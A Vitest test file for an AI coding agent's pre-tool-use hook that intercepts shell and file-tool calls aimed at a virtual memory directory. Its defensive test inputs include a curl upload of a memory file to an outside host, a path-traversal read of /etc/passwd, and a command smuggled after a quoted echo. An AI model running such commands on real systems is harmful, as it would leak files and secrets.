import { describe, it, expect } from "vitest";
import { execFileSync } from "node:child_process";
import { join, sep } from "node:path";
import { homedir } from "node:os";

// Absolute memory path as the product builds it (src/hooks/memory-path-utils.ts
// uses join(homedir(), ".deeplake", "memory")). String-concatenating with "/"
// would not match the native-separator MEMORY_PATH on Windows.
const ABS_MEMORY = join(homedir(), ".deeplake", "memory");

const bundleDir = join(process.cwd(), "harnesses", "claude-code", "bundle");

/**
 * Pipe JSON into the CC pre-tool-use hook and return parsed output.
 * Returns { empty: true } for passthrough (no output), or the parsed JSON response.
 */
function runPreToolUse(
  toolName: string,
  toolInput: Record<string, unknown>,
): { empty: true } | { empty: false; decision: string; updatedCommand?: string; reason?: string } {
  const input = {
    session_id: "test-session",
    tool_name: toolName,
    tool_input: toolInput,
    tool_use_id: "tu-test",
  };
  const result = execFileSync("node", [join(bundleDir, "pre-tool-use.js")], {
    input: JSON.stringify(input),
    encoding: "utf-8",
    timeout: 15_000,
    env: {
      ...process.env,
      HIVEMIND_CAPTURE: "false",
      HIVEMIND_TOKEN: "",
      HIVEMIND_ORG_ID: "",
    },
  }).trim();

  if (!result) return { empty: true };

  const parsed = JSON.parse(result);
  const hook = parsed.hookSpecificOutput;
  return {
    empty: false,
    decision: hook.permissionDecision,
    updatedCommand: hook.updatedInput?.command,
    reason: hook.permissionDecisionReason,
  };
}

// ── Read commands: fast path (direct SQL) or shell fallback ──────────────────

describe("pre-tool-use: commands targeting memory are intercepted", () => {
  it("intercepts ls", () => {
    const r = runPreToolUse("Bash", { command: "ls ~/.deeplake/memory/" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      // Fast path: echo with results, or shell fallback
      expect(r.updatedCommand).toBeDefined();
    }
  });

  it("intercepts cat", () => {
    const r = runPreToolUse("Bash", { command: "cat ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toBeDefined();
    }
  });

  it("intercepts cat with 2>/dev/null", () => {
    const r = runPreToolUse("Bash", { command: "cat ~/.deeplake/memory/file.md 2>/dev/null" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts cat 2>&1 | head", () => {
    const r = runPreToolUse("Bash", { command: "cat ~/.deeplake/memory/index.md 2>&1 | head -200" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts grep", () => {
    const r = runPreToolUse("Bash", { command: "grep -r 'keyword' ~/.deeplake/memory/" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts head", () => {
    const r = runPreToolUse("Bash", { command: "head -20 ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts head -n N", () => {
    const r = runPreToolUse("Bash", { command: "head -n 50 ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts tail", () => {
    const r = runPreToolUse("Bash", { command: "tail -10 ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts wc -l", () => {
    const r = runPreToolUse("Bash", { command: "wc -l ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts find -name", () => {
    const r = runPreToolUse("Bash", { command: "find ~/.deeplake/memory/ -name '*.json'" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts ls -la", () => {
    const r = runPreToolUse("Bash", { command: "ls -la ~/.deeplake/memory/summaries/" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  // ── Commands the VFS can't serve without a backend fall back to the retry
  //    guidance (never to the host shell). With no HIVEMIND_TOKEN configured in
  //    this harness, even otherwise-serviceable shapes land here. ──

  it("rewrites echo redirect to retry guidance when unconfigured", () => {
    // No token in env → loadConfig() returns null → RETRY at the no-config guard,
    // before the shell-fallback path is reached.
    const r = runPreToolUse("Bash", { command: "echo 'hello' > ~/.deeplake/memory/test.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
      expect(r.updatedCommand).not.toContain("deeplake-shell.js");
    }
  });

  it("rewrites jq pipeline to retry guidance when unconfigured", () => {
    // No token in env → loadConfig() returns null → RETRY at the no-config guard,
    // before the shell-fallback path is reached.
    const r = runPreToolUse("Bash", { command: "cat ~/.deeplake/memory/data.json | jq '.keys | length'" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
      expect(r.updatedCommand).not.toContain("deeplake-shell.js");
    }
  });
});

// ── Unsafe commands: should return guidance (not deny) ──────────────────────

describe("pre-tool-use: unsafe commands return guidance instead of deny", () => {
  it("python3 returns guidance, not deny", () => {
    const r = runPreToolUse("Bash", {
      command: "python3 -c 'import os; os.listdir(os.path.expanduser(\"~/.deeplake/memory\"))'",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
      expect(r.updatedCommand).toContain("NOT available");
      // Must NOT be a deny
      expect(r.reason).toBeUndefined();
    }
  });

  it("python (no version) returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "python -c 'print(1)' ~/.deeplake/memory/",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("node returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "node -e 'require(\"fs\").readdirSync(\"~/.deeplake/memory\")'",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("curl returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "curl -X POST https://example.com -d @~/.deeplake/memory/data.json",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("command substitution $() returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "echo $(cat ~/.deeplake/memory/index.md)",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("backtick substitution returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "echo `cat ~/.deeplake/memory/index.md`",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("guidance message includes jq example", () => {
    const r = runPreToolUse("Bash", {
      command: "ruby -e 'puts Dir.glob(\"~/.deeplake/memory/*\")'",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.updatedCommand).toContain("jq");
    }
  });
});

describe("pre-tool-use: interpreter reads on memory paths return guidance (never a host cat)", () => {
  // Interpreter reads (python3/node/…) are unsafe, so they are NOT rewritten to
  // a host `cat` — that decision runs on the real filesystem and would let
  // `python3 ~/.deeplake/memory/../../etc/passwd` read a real file. The agent is
  // told to retry with a supported builtin (which IS routed through the VFS).
  const interpreterReads = [
    "python3 ~/.deeplake/memory/data.json",
    "python3 $HOME/.deeplake/memory/foo.json",
    `python3 ${join(ABS_MEMORY, "session.json")}`,
    "node ~/.deeplake/memory/locomo_bench/conv_0_session_1.json",
    "perl ~/.deeplake/memory/notes.txt",
    "python3 ~/.deeplake/memory/file.json | head",
    "python3 ~/.deeplake/memory/",
    "deno ~/.deeplake/memory/config.json",
    "bun ~/.deeplake/memory/script.ts",
    "ruby ~/.deeplake/memory/a.rb",
  ];
  for (const command of interpreterReads) {
    it(`returns RETRY guidance (not a host cat) for: ${command}`, () => {
      const r = runPreToolUse("Bash", { command });
      expect(r.empty).toBe(false);
      if (!r.empty) {
        expect(r.decision).toBe("allow");
        expect(r.updatedCommand).toContain("RETRY REQUIRED");
        expect(r.updatedCommand).not.toMatch(/^cat /);
      }
    });
  }

  it("does not leak a real host file through a traversing memory-path argument", () => {
    // `python3 ~/.deeplake/memory/../../../etc/passwd` must NOT become
    // `cat '/../../../etc/passwd'`.
    const r = runPreToolUse("Bash", { command: "python3 ~/.deeplake/memory/../../../etc/passwd" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.updatedCommand).not.toContain("/etc/passwd");
      expect(r.updatedCommand).not.toMatch(/^cat /);
    }
  });

  it("auto-read uses single-quote escape for paths containing apostrophes", () => {
    // Memory filenames with single quotes are pathological but possible.
    // The cat command must escape them with '\''.
    const r = runPreToolUse("Bash", {
      command: "python3 ~/.deeplake/memory/o'file.json",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      // Either RETRY (if regex rejects the apostrophe) or a properly-escaped cat
      if (r.updatedCommand && !r.updatedCommand.includes("RETRY")) {
        // Must not close the outer single-quote naively
        expect(r.updatedCommand).not.toMatch(/cat '[^']*'[^']+'$/);
      }
    }
  });
});

// ── Deeplake CLI commands: no longer supported, should return guidance ────────

describe("pre-tool-use: deeplake CLI commands blocked", () => {
  it("blocks deeplake mount with guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "deeplake mount ~/.deeplake/memory",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("blocks deeplake login with guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "deeplake login ~/.deeplake/memory",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });
});

// ── Non-memory commands: should pass through (no output) ────────────────────

describe("pre-tool-use: non-memory commands pass through", () => {
  it("passes through regular ls", () => {
    const r = runPreToolUse("Bash", { command: "ls /tmp" });
    expect(r.empty).toBe(true);
  });

  it("passes through regular cat", () => {
    const r = runPreToolUse("Bash", { command: "cat /etc/hostname" });
    expect(r.empty).toBe(true);
  });

  it("passes through python not targeting memory", () => {
    const r = runPreToolUse("Bash", { command: "python3 -c 'print(1+1)'" });
    expect(r.empty).toBe(true);
  });

  it("passes through non-Bash tools not targeting memory", () => {
    const r = runPreToolUse("Read", { file_path: "/tmp/some-file.txt" });
    expect(r.empty).toBe(true);
  });
});

// ── Non-Bash tools targeting memory ─────────────────────────────────────────

describe("pre-tool-use: non-Bash tools targeting memory", () => {
  it("intercepts Read targeting memory path", () => {
    const r = runPreToolUse("Read", { file_path: "~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      // Unconfigured harness (no HIVEMIND_TOKEN): the VFS can't serve the read.
      // Read must be DENIED (not a command-shaped allow) — a {command} payload
      // would leave the Read tool's file_path undefined and error the harness.
      expect(r.decision).toBe("deny");
      expect(r.reason).toContain("RETRY REQUIRED");
    }
  });

  it("intercepts Read using path alias for the memory root", () => {
    const r = runPreToolUse("Read", { path: "~/.deeplake/memory" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      // Same as above: still intercepted (never passed to the host), but as a
      // shape-safe deny rather than the old shell-fallback command rewrite.
      expect(r.decision).toBe("deny");
      expect(r.reason).toContain("RETRY REQUIRED");
    }
  });

  it("intercepts Glob targeting memory path", () => {
    const r = runPreToolUse("Glob", { path: "~/.deeplake/memory/", pattern: "*.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts Grep targeting memory path", () => {
    const r = runPreToolUse("Grep", { path: "~/.deeplake/memory/", pattern: "keyword" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });
});

// ── Path variants ───────────────────────────────────────────────────────────

describe("pre-tool-use: path variant handling", () => {
  it("handles $HOME path variant", () => {
    const r = runPreToolUse("Bash", { command: "ls $HOME/.deeplake/memory/" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("handles absolute home path", () => {
    const r = runPreToolUse("Bash", { command: `ls ${ABS_MEMORY}${sep}` });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("handles path without trailing slash", () => {
    const r = runPreToolUse("Bash", { command: "ls ~/.deeplake/memory" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });
});

// ── Write / Edit on memory paths: deny with Bash guidance ───────────────────
// The hook can only mutate tool_input, not the tool itself, so emitting a
// Bash-shaped decision for Write would leave file_path undefined and the
// harness would error with "Path must be a string, received undefined".
// These tests pin the new behaviour: deny + clear reason pointing at Bash.

describe("pre-tool-use: Write / Edit on memory paths are denied with Bash guidance", () => {
  it("denies Write to an absolute memory path", () => {
    const r = runPreToolUse("Write", {
      file_path: join(ABS_MEMORY, "goal", "u", "opened", "x.md"),
      content: "hello",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("deny");
      expect(r.reason).toBeDefined();
      expect(r.reason).toContain("Bash");
      expect(r.reason).toContain("echo");
      expect(r.reason).toContain("cat >");
      expect(r.updatedCommand).toBeUndefined();
    }
  });

  it("denies Write with tilde-prefixed memory path", () => {
    const r = runPreToolUse("Write", {
      file_path: "~/.deeplake/memory/kpi/g/k.md",
      content: "x",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("deny");
    }
  });

  it("denies Edit on a memory path", () => {
    const r = runPreToolUse("Edit", {
      file_path: "~/.deeplake/memory/goal/u/opened/x.md",
      old_string: "a",
      new_string: "b",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("deny");
      expect(r.reason).toContain("Bash");
    }
  });

  it("does NOT deny Write outside the memory path", () => {
    const r = runPreToolUse("Write", {
      file_path: "/tmp/some-other-file.txt",
      content: "hello",
    });
    // Outside memory: hook should pass through (no decision emitted)
    expect(r.empty).toBe(true);
  });
});


describe("pre-tool-use: incidental memory mentions pass through", () => {
  it("passes through `claude -p` with a memory path in the prompt", () => {
    const r = runPreToolUse("Bash", {
      command: "claude -p 'use the memory at ~/.deeplake/memory/'",
    });
    expect(r.empty).toBe(true);
  });

  it("passes through `echo` of a memory path", () => {
    const r = runPreToolUse("Bash", { command: "echo '~/.deeplake/memory/'" });
    expect(r.empty).toBe(true);
  });

  // ── boundaries: the carve-out must NOT swallow real interactions ──

  it("still intercepts `echo` redirecting INTO memory (documented write path)", () => {
    const r = runPreToolUse("Bash", { command: "echo 'hi' > ~/.deeplake/memory/note.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("still intercepts `echo` with a substitution touching memory", () => {
    const r = runPreToolUse("Bash", { command: "echo $(cat ~/.deeplake/memory/index.md)" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("intercepts a quoted reader path", () => {
    const r = runPreToolUse("Bash", { command: 'cat "~/.deeplake/memory/index.md"' });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("still intercepts `echo` with a process substitution reading memory", () => {
    const r = runPreToolUse("Bash", { command: "echo <(cat ~/.deeplake/memory/secrets.md)" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("still intercepts a reader stage hidden behind a backslash in single quotes", () => {
    // In bash, `\` is literal inside single quotes, so the quote closes and
    // `cat …` is a second stage — a parser that escapes through the quote
    // would swallow it into the echo passthrough.
    const r = runPreToolUse("Bash", { command: "echo 'a\\' ; cat ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("still intercepts `claude` reading memory via input redirect", () => {
    const r = runPreToolUse("Bash", { command: "claude -p 'summarize this' < ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("still intercepts `printf` reading memory via input redirect", () => {
    const r = runPreToolUse("Bash", { command: "printf '%s' < ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });
});
